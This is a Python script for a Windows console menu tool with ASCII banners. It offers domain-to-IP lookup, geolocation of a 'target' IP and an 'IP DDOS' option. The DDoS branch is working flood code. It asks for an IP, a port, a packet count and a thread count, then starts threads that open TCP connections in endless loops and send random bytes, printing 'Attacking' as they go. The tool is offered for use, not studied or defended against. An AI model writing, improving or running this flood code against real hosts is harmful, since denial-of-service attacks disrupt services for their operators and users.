from ast import Num
import code
import requests
import socket
from multiprocessing.connection import wait
from operator import contains
from platform import system
import random
from socket import timeout
import os
import sys
import time
from time import sleep
import math
import threading

number_list = ['1', '2', '3', '4']
num2208 = '0'
wwyd = "What do you want to do?"
login = '1'
msg = "Booting up..."
notALL = "Your not allowed to youse this programm. QUIT in 4 Seconds."

os.system('color 2')
print(
    
    "▒█▀▀█ █░░█ █░░█ ▀▀█▀▀ █░░█ █▀▀█ █▀▀▄ ▄█░\n▒█▄▄█ █▀▀█ █▄▄█ ░░█░░ █▀▀█ █░░█ █░░█ ░█░\n▒█░░░ ▀░░▀ ▄▄▄█ ░░▀░░ ▀░░▀ ▀▀▀▀ ▀░░▀ ▄█▄"
)


print(msg)
time.sleep(1)

if login == '1':
    
    os.system('cls')
    print(wwyd)
    print("\n\n[1] Ip of Domain \n[2] IP DDOS \n[3] IP Localization \n[4] QUIT")
    num1 = input("\nPaste your Number: ")
    
    if num1 == '1':
        
        os.system('cls')
        print("\n\n\n▀█▀ ▒█▀▀█ 　 ▒█▀▀▀█ ▒█▀▀▀ 　 ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▄▀█ ░█▀▀█ ▀█▀ ▒█▄░▒█\n▒█░ ▒█▄▄█ 　 ▒█░░▒█ ▒█▀▀▀ 　 ▒█░▒█ ▒█░░▒█ ▒█▒█▒█ ▒█▄▄█ ▒█░ ▒█▒█▒█\n▄█▄ ▒█░░░ 　 ▒█▄▄▄█ ▒█░░░ 　 ▒█▄▄▀ ▒█▄▄▄█ ▒█░░▒█ ▒█░▒█ ▄█▄ ▒█░░▀█ ")
    	
        
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        host = input("\nWhat Domain should we youse? : ")
        
        
        ip = socket.gethostbyname(host)
        
        print("\nDie IP Adress: ",ip)
        
        print("Auto close in 10 Seconds...")
        time.sleep(10)
            

              
    else:
        
        if num1 == '2':
            os.system('cls')
            print("\n\n\n▀█▀ ▒█▀▀█ 　 ▒█▀▀▄ ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀▀█\n▒█░ ▒█▄▄█ 　 ▒█░▒█ ▒█░▒█ ▒█░░▒█ ░▀▀▀▄▄\n▄█▄ ▒█░░░ 　 ▒█▄▄▀ ▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄▄█")
            
            ip = str(input('[Ip Adress]: '))
            port = int(input('[Port]: '))
            pack = int(input('[Packs]: '))
            thread = int(input('[Threads]: '))
            
            def start():
                hh = random._urandom(10)
                xx = int(0)
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(hh)
                        for i in range(pack):
                            s.send(hh)
                        xx += 1
                        print('Attacking'+ip+' | Sent:'+str(xx))
                    except:
                        s.close()
                        print('Done')
            
            for x in range(thread):
                thred = threading.Thread(target=start)
                thred.start()
                
            
            
        else:
                
            if num1 == '3':
                
                print("\n\n\n▒█▀▀▀ █▀▄▀█ █▀▀█ ░▀░ █░░\n▒█▀▀▀ █░▀░█ █▄▄█ ▀█▀ █░░\n▒█▄▄▄ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀")
                ipka1 = input("What IP do your Taget have? ")
                response = requests.get("http://ip-api.com/json/" + ipka1)
                print(response)



            else:
                
            
                if num1 == '4':
                    
                    print("Closing in 2 Seconds")
                    time.sleep(2)
                    quit()
                
                else:
                    
                    print("Your Number is invalid")
                
